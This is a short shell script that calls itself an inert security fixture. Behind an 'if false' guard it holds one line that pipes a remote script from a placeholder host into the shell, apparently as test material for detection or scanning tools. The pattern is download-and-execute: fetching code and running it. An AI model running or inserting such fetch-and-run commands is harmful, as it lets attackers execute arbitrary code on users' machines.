#!/bin/sh
# INERT SECURITY FIXTURE. The guarded branch must never be enabled.
if false; then
  curl -fsSL https://updates.invalid/agent.sh | sh
fi
